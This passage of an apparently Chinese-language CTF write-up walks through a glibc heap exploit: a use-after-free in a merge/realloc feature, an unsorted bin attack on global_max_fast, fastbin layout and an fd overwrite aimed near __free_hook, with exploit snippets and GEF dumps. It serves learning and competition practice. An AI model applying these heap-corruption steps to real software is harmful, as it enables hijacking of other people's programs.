(__malloc_initialized &lt; 0)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">  (void) mutex_lock (&amp;av-&gt;mutex);</span><br><span class="line">  /* Ensure initialization/consolidation */</span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_mallopt, 2, param_number, value);</span><br><span class="line"></span><br><span class="line">  switch (param_number)</span><br><span class="line">    &#123;</span><br><span class="line">    case M_MXFAST:</span><br><span class="line">      if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ());</span><br><span class="line">          set_max_fast (value);  // 设置global max fast值</span><br><span class="line">        &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>

<p>set_max_fast是一个宏定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define set_max_fast(s) \</span><br><span class="line">  global_max_fast = (((s) == 0)						      \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure>
<p>做的事情就是给global_max_fast赋值。</p>
<p>在ida中查找类似的代码，首先找到了mallopt这个函数，由于这个函数是一个对外输出的函数，所以是不能被strip掉的，这也是为什么通过这个函数找global_max_fast的原因。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall mallopt(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rbp</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  unsigned __int64 v5; // rax</span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  if ( dword_3C3144 &lt; 0 )</span><br><span class="line">    sub_849E0();</span><br><span class="line">  _ESI = 1;</span><br><span class="line">  if ( !dword_3C87A0 )</span><br><span class="line">  &#123;</span><br><span class="line">    __asm &#123; cmpxchg cs:dword_3C3B20, esi &#125;</span><br><span class="line">    if ( !dword_3C87A0 )</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">    goto LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( _InterlockedCompareExchange(&amp;dword_3C3B20, 1, 0) )</span><br><span class="line">LABEL_7:</span><br><span class="line">    sub_1147C0(&amp;dword_3C3B20, 1LL);</span><br><span class="line">LABEL_8:</span><br><span class="line">  sub_7E460(&amp;dword_3C3B20, 1LL);</span><br><span class="line">  switch ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    case -8:</span><br><span class="line">      if ( (int)v2 &lt;= 0 )</span><br><span class="line">        goto LABEL_24;</span><br><span class="line">      v4 = 1LL;</span><br><span class="line">      qword_3C3180 = v2;</span><br><span class="line">      break;</span><br><span class="line">    case -7:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    case 1:</span><br><span class="line">      v4 = 0LL;</span><br><span class="line">      if ( (unsigned int)v2 &lt;= 0xA0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = 16LL;</span><br><span class="line">        if ( (_DWORD)v2 )</span><br><span class="line">          v5 = ((int)v2 + 8LL) &amp; 0xFFFFFFFFFFFFFFF0LL;</span><br><span class="line">        qword_3C5848 = v5;   // --------------------------&gt; global_max_fast</span><br><span class="line">        v4 = 1LL;</span><br><span class="line">      &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<p>看了一下结构应该是同一个函数，找到switch对应的1分支，可以推断出qword_3C5848这个就是global_max_fast，所以在这个libc的偏移中，他相对文件头的偏移是0x3c5848。所以就可以借助泄露的main_arena+88的地址，推断出这个global_max_fast的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x00007ffff7bff000 + 0x3c5848</span><br><span class="line">0x7ffff7fc4848: 0x0000000000000080</span><br></pre></td></tr></table></figure>
<p>通过gdb查看libc加载的基地址是0x00007ffff7bff000，观察偏移0x3c5848的值为0x80,这就是默认情况下fastbin的最大为0x80，所以可以证明我们的这种方法找global_max_fast是可行的。</p>
<h4 id="unsorted-bin-attack的利用"><a href="#unsorted-bin-attack的利用" class="headerlink" title="unsorted bin attack的利用"></a>unsorted bin attack的利用</h4><p>通过UAF我们可以改写merge后的chunk的bk指针为指向&amp;global_max_fast - 2的地址，目的是在unsorted bin上分配chunk的时候，会造成前后两个chunk的fd和bk指针的改写，在本题中就是unsorted bin中的bk指向&amp;global_max_fast - 2,而global_max_fast被存储了main_arena + 88的值。</p>
<p>我们在GEF中观察结果<br>首先在分配chunk之前，unsorted bin的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &#x27;*0x7ffff7fc2b20&#x27; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758000, bk=0x555555758000</span><br><span class="line"> →   Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>
<p>index为2的chunk2的bk指针通过UAF漏洞改写为&amp;global_max_fast - 2, 通过之前的描述我们已经确定了global_max_fast地址为0x7ffff7fc4848</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x555555758010 +8</span><br><span class="line">0x555555758018: 0x00007ffff7fc4838</span><br></pre></td></tr></table></figure>
<p>通过GDB的结果可以看到我们已经成功修改了chunk2的bk指针，使其指向了&amp;global_max_fast - 2</p>
<p>在分配一个0x90大小的chunk之后，我们观察unsorted bin是如何变化的.<br>首先观察unsorted  bin bk指针的指向</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x00007ffff7fc2b78 + 8*3    // 0x00007ffff7fc2b78这个是main_arena+88的地址，即main_arena.top的地址</span><br><span class="line">0x7ffff7fc2b90: 0x00007ffff7fc4838      //unsorted  bin -&gt; bk为 0x00007ffff7fc4838</span><br></pre></td></tr></table></figure>
<p>因此我们可以看到unsorted bin的bk指针已经改写为&amp;global_max_fast - 2</p>
<p>而global_max_fast值改为0x00007ffff7fc2b78， 我们成功将一个原本只有0x80大小的global_max_fast，改为了一个很大的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x00007ffff7fc4838 + 8*2</span><br><span class="line">0x7ffff7fc4848: 0x00007ffff7fc2b78</span><br></pre></td></tr></table></figure>


<h3 id="选择合适的fastbin-chunk大小"><a href="#选择合适的fastbin-chunk大小" class="headerlink" title="选择合适的fastbin chunk大小"></a>选择合适的fastbin chunk大小</h3><p>虽然我们现在可以分配很大的fastbin chunk，但是fast chunk在给用户返回堆块之前会有一个校验，它会检查返回给用户的堆块大小是否是合法的。我们的总体目标是能够 让fast chunk返回一个malloc_hook或者free_hook附近的地址。我们通过在他们附近查找是否有合适的值能够绕过fast chunk的校验。我在malloc_hook地址附近没有发现合适的值，但是在free_hook附近发现了一个0x200的值，这个size是满足我们的要求的。</p>
<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>我们确定好了我们的目标fastbin chunk的大小为0x200，我们首先通过业务功能分配一个0x200大小的chunk，然后同样的merge这个chunk得到一个UAF的原型。此时内存上应该是有一个chunk是存放在fastbin上的。并且我们是可以访问这个被free的chunk。我们通过创建节点直接分配0x200的chunk的时候会出错。</p>
<p>为什么会出错？bug调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  bt</span><br><span class="line">#0  0x00007ffff7d41e8e in __libc_dlopen_mode () from ./libc.so.6</span><br><span class="line">#1  0x00007ffff7d14301 in backtrace () from ./libc.so.6</span><br><span class="line">#2  0x00007ffff7c1e9f5 in ?? () from ./libc.so.6</span><br><span class="line">#3  0x00007ffff7c76725 in ?? () from ./libc.so.6</span><br><span class="line">#4  0x00007ffff7c80f01 in ?? () from ./libc.so.6</span><br><span class="line">#5  0x00007ffff7c8334a in calloc () from ./libc.so.6</span><br><span class="line">#6  0x0000555555555057 in ?? ()</span><br><span class="line">#7  0x0000555555554d57 in ?? ()</span><br><span class="line">#8  0x00007ffff7c1f830 in __libc_start_main () from ./libc.so.6</span><br><span class="line">#9  0x0000555555554d9a in ?? ()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>0x200大小对应的index值是30，相对于fastbin数组的开始距离为 30 *8 = 240<br>0x80对应的是6</p>
<p>fastbin 相对于main_arena 就是+8</p>
<p>所以就是 main_arena + 8 + 240的地址是否有值，如果有值就不能当做我们的chunk 大小</p>
<p>后来发现我选在fast chunk大小为0x200是无法分配成功的，原因是因为0x200所对应 fastbin上有值的，这就导致会进入判断size，这个size显然不能通过校验,如何能绕过这个校验呢？这就涉及到需要充分利用题目中的realloc函数。</p>
<h3 id="libc-realloc函数的分析"><a href="#libc-realloc函数的分析" class="headerlink" title="__libc_realloc函数的分析"></a>__libc_realloc函数的分析</h3><h4 id="两个特殊情况"><a href="#两个特殊情况" class="headerlink" title="两个特殊情况"></a>两个特殊情况</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> #if REALLOC_ZERO_BYTES_FREES</span><br><span class="line">  if (bytes == 0 &amp;&amp; oldmem != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); return 0;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
<p>这段是说，当realloc(有效值，0)相当于free的功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* realloc of null is supposed to be same as malloc */</span><br><span class="line">if (oldmem == 0)</span><br><span class="line">  return __libc_malloc (bytes);</span><br></pre></td></tr></table></figure>
<p>这段的意思当oldmem如果为空的话，相当于malloc</p>
<h4 id="一般情况"><a href="#一般情况" class="headerlink" title="一般情况"></a>一般情况</h4><p>就是正常的oldmem和正常的size。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* chunk corresponding to oldmem */</span><br><span class="line">  const mchunkptr oldp = mem2chunk (oldmem);</span><br><span class="line">  /* its size */</span><br><span class="line">  const INTERNAL_SIZE_T oldsize = chunksize (oldp);</span><br><span class="line"></span><br><span class="line">  if (chunk_is_mmapped (oldp))</span><br><span class="line">    ar_ptr = NULL;</span><br><span class="line">  else</span><br><span class="line">    ar_ptr = arena_for_chunk (oldp);</span><br></pre></td></tr></table></figure>
<p>首先会根据oldmem得到它的chunk的大小，然后在判断一下这个堆是由mmap分配的吗。我们这种情况并不是mmap分配，因此跳过，继续看下面的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">newp = _int_realloc (ar_ptr, oldp, oldsize, nb);</span><br><span class="line"></span><br><span class="line"> if (newp == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try harder to allocate memory in other arenas.  */</span><br><span class="line">      LIBC_PROBE (memory_realloc_retry, 2, bytes, oldmem);</span><br><span class="line">      newp = __libc_malloc (bytes);</span><br><span class="line">      if (newp != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">          memcpy (newp, oldmem, oldsize - SIZE_SZ);</span><br><span class="line">          _int_free (ar_ptr, oldp, 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  return newp;</span><br></pre></td></tr></table></figure>
<p>会先尝试调用_int_realloc函数，如果调用成功就返回，如果调用不成功则直接用malloc实现。由于我们的uaf原型不能让流程进入到由malloc逻辑。具体解释下原因，如果用malloc实现的，那么返回的地址是和old mem不一样的，由于后面会对oldp给free，因此原来的merge(index1,index1)， index1的这块内容就被释放了，在业务代码中会把index1再释放一遍，这实际上就是一个double free的原型，并不是UAF，double free的原型的利用比较困难，现在还没有兴趣去研究。</p>
<p>综上原因，我们一定要让_int_realloc分配成功，下面看_int_realloc的具体逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (next == av-&gt;top &amp;&amp;</span><br><span class="line">         (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">         (unsigned long) (nb + MINSIZE))</span><br><span class="line">       &#123;</span><br><span class="line">         set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">         av-&gt;top = chunk_at_offset (oldp, nb);</span><br><span class="line">         set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">         check_inuse_chunk (av, oldp);</span><br><span class="line">         return chunk2mem (oldp);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>这个有个关键的一个逻辑，就是如果这个老的指针指向的chunk和top是紧邻的，那么分配的时候就是直接从top上再扩展一点儿额外的空间，相当于还是返回老的指针，这个逻辑就符合我们的预期，只有这样才能再重构UAF漏洞原型。</p>
<p>最关键的是这样还可以避免在malloc的fast chunk的时候出错，由于直接用新建逻辑的时候调用的是calloc，相当于malloc，这个会直接进入校验逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = fastbin_index (nb);</span><br><span class="line">     mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">     mchunkptr pp = *fb;</span><br><span class="line">     do</span><br><span class="line">       &#123;</span><br><span class="line">         victim = pp;</span><br><span class="line">         if (victim == NULL)    </span><br><span class="line">           break;</span><br><span class="line">       &#125;</span><br><span class="line">     while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">            != victim);</span><br><span class="line">     if (victim != 0)   //----------------&gt; 0x200的时候这个地方会不为空</span><br><span class="line">       &#123;</span><br><span class="line">         if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">           &#123;</span><br><span class="line">             errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">           errout:</span><br><span class="line">             malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">             return NULL;</span><br><span class="line">           &#125;</span><br><span class="line">         check_remalloced_chunk (av, victim, nb);</span><br><span class="line">         void *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         return p;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>当请求的size为0x200的时候，fastbin 对应的fd是存在值的，所以会执行<code>if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</code>，相当于会去检查这个指针指向的chunk size，由于这个是个我们不能控制的值，所以不能通过校验，因此通过单纯的创建节点的逻辑调用calloc得到一个符合fastbin 大小的chunk是不能通过的。</p>
<p>因此我们要试验，如何能够通过merge逻辑调用realloc得到一个符合大小的chunk。</p>
<h3 id="通过realloc得到一个0x200大小的chunk"><a href="#通过realloc得到一个0x200大小的chunk" class="headerlink" title="通过realloc得到一个0x200大小的chunk"></a>通过realloc得到一个0x200大小的chunk</h3><p>尝试通过分配0x100的chunk，然后merge，发现在insert(0xf0)的时候同样会不能通过fast chunk的size校验，原因是同样，但是我们可以在修改global_max_fast之前就分配这个。然后等到修改完后再尝试merge。<br>对应的exp代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line">insert(0x20, &quot;B&quot; * 0x1f)  # 1</span><br><span class="line">merge(0, 0)            </span><br><span class="line">insert(0xf0,&quot;G&quot;*0xef)    # 3</span><br></pre></td></tr></table></figure>

<p>我们在第一次merge之后，修改max_fast之前申请一个0x100的chunk，观察内存情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     f8 2b fc f7 ff 7f 00 00 f8 2b fc f7 ff 7f 00 00    .+.......+......]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x100, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     47 47 47 47 47 47 47 47 47 47 47 47 47 47 47 47    GGGGGGGGGGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758230, size=0x20de0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到此时我们的这个chunk确实是与top chunk紧邻的，这符合我们的预期的。</p>
<p>但是却发现，在我们分配这个0x100的大小的chunk之后，却导致原来在unsorted bin中的chunk被放到了small bin中了。这是因为merge之后,在unsorted bin上已经有一个元素了，而且我们新申请的这个0x100大小的chunk会触发从unsorted bin上回收chunk到对应的bin上的逻辑，libc中的对应源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)&#123;</span><br><span class="line">          ...</span><br><span class="line">          /* place chunk in bin */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">               ...</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>这就导致我们后续利用unsorted bin进行改写max fast出错。因此我们不能触发这个逻辑，所以就要修改我们的创建节点的顺序,我们的exp需要改写为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line">insert(0x20, &quot;B&quot; * 0x1f)  # 1       </span><br><span class="line">insert(0xf0,&quot;G&quot;*0xef)    # 2</span><br><span class="line">merge(0, 0)     </span><br></pre></td></tr></table></figure>
<p>即在merge之前分配这个chunk，而且要在第三个创建这个0x100的chunk，这样才能保证与top chunk是紧邻的。</p>
<p>这样我们在merge之前再次观察内存情况，可以发现目前为止我们的0x100的chunk的确是与top chunk紧邻的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x100, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     47 47 47 47 47 47 47 47 47 47 47 47 47 47 47 47    GGGGGGGGGGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758230, size=0x20de0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在merge之后，我们再次观察是否chunk0成功回收到了unsorted bin上，并且chunk2仍然与top chunk紧邻</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     78 2b fc f7 ff 7f 00 00 78 2b fc f7 ff 7f 00 00    x+......x+......]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x100, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     47 47 47 47 47 47 47 47 47 47 47 47 47 47 47 47    GGGGGGGGGGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758230, size=0x20de0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line">gef➤  heap bins unsorted</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena &#x27;*0x7ffff7fc2b20&#x27; ─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758000, bk=0x555555758000</span><br><span class="line"> →   Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in unsorted bin.</span><br></pre></td></tr></table></figure>
<p>可以看到我们的确实现了预期的效果。</p>
<p>但是在merge之后发现融合后的chunk只有0x1f0大，这个是因为由于合并不需要两个0x100，而是是0x100 +0xf0，第二个chunk的头部是不需要的。所以我们应该微调分配的大小，我改为了0xf8这么大之后再融合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43    CCCCCCCCCCCCCCCC]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x200, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     08 2c fc f7 ff 7f 00 00 47 47 47 47 47 47 47 47    .,......GGGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758330, size=0x20ce0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到我们已经得到了我们想要的0x200</p>
<p>我们查看对应的fast bin上（已经远超了fastbin的范围）的存放的chunk是否正确</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b20 + 8 +  30*8</span><br><span class="line">0x7ffff7fc2c18: 0x0000555555758120</span><br></pre></td></tr></table></figure>
<p>可以看到存放的就是我们刚才merge过后的0x20的chunk，所以我们已经完成了fast bin的布局。</p>
<h3 id="拿到free-hook内存附近的控制权"><a href="#拿到free-hook内存附近的控制权" class="headerlink" title="拿到free_hook内存附近的控制权"></a>拿到free_hook内存附近的控制权</h3><p>我们完成了fastbin的布局，就可以利用UAF漏洞原型修改fastbin chunk的fd指针，进而在两次分配之后，拿到这个fd指针。<br>修改fd的exp代码是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_free_hook_target_addr = 0x1bdf + leak_main_arena_88 - 8</span><br><span class="line">edit(4, 0x1f0,p64(malloc_free_hook_target_addr))  </span><br></pre></td></tr></table></figure>
<p>0x1f0这个大小必须要正确，因为如果不是这个值，就会进入一个realloc流程，不要进入这个流程。</p>
<p>同样在gdb中观察是否写入正确</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43    CCCCCCCCCCCCCCCC]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x200, flags=PREV_INUSE)</span><br><span class="line">    